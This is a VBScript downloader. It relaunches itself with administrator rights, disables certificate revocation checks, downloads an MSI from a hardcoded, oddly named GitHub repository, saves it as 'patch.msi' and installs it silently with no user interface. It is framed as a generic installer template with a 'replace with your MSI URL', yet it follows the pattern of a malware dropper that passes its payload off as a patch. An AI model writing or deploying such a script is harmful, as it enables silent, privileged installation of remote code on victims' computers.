
' Create Shell and FileSystemObject objects upfront
Dim shell, fso, args, elevated, i
Set shell = CreateObject("Shell.Application")
Set fso = CreateObject("Scripting.FileSystemObject")

' Check for elevation argument
Set args = WScript.Arguments
elevated = False
For i = 0 To args.Count - 1
    If LCase(args(i)) = "elevated" Then
        elevated = True
        Exit For
    End If
Next

' Relaunch with admin privileges if not elevated
If Not elevated Then
    shell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " elevated", "", "runas", 1
    WScript.Quit
End If

' Create temp folder if it doesn't exist
On Error Resume Next
If Not fso.FolderExists("C:\Temp") Then
    fso.CreateFolder("C:\Temp")
End If
On Error GoTo 0

' Function to download a file
Function DownloadFile(url, dest)
    On Error Resume Next
    Dim http, stream
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")

    Const WINHTTP_OPTION_DISABLE_FEATURE = 4
    Const WINHTTP_DISABLE_CERT_REVOCATION = &H80
    http.Option(WINHTTP_OPTION_DISABLE_FEATURE) = WINHTTP_DISABLE_CERT_REVOCATION

    http.Open "GET", url, False
    http.SetTimeouts 5000, 5000, 10000, 10000
    http.Send

    If http.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1 ' Binary
        stream.Open
        stream.Write http.ResponseBody
        stream.SaveToFile dest, 2 ' Overwrite
        stream.Close
        DownloadFile = True
    Else
        DownloadFile = False
    End If
    On Error GoTo 0
End Function

' Function to run MSI installer and wait for completion
Function RunMSI(msiPath)
    Dim exec, exitCode
    On Error Resume Next
    Set exec = CreateObject("WScript.Shell").Exec("msiexec.exe /i """ & msiPath & """ /qn /norestart")
    If Err.Number <> 0 Then
        RunMSI = False
        Exit Function
    End If
    Do While exec.Status = 0
        WScript.Sleep 500
    Loop
    exitCode = exec.ExitCode
    RunMSI = (exitCode = 0)
    On Error GoTo 0
End Function

' === Insert your MSI URL below ===
Dim msiUrl, msiPath
msiUrl = "https://github.com/cloudsharingbk/ubiquitous-octo-eureka/raw/refs/heads/branches-pages/ubiquitous.msi"  ' Replace with your MSI URL
msiPath = "C:\Temp\patch.msi"

If DownloadFile(msiUrl, msiPath) Then
    If RunMSI(msiPath) Then
        WScript.Echo "Installation completed successfully."
    Else
        WScript.Echo "Installation failed or was interrupted."
    End If
Else
    WScript.Echo "Failed to download the MSI file."
End If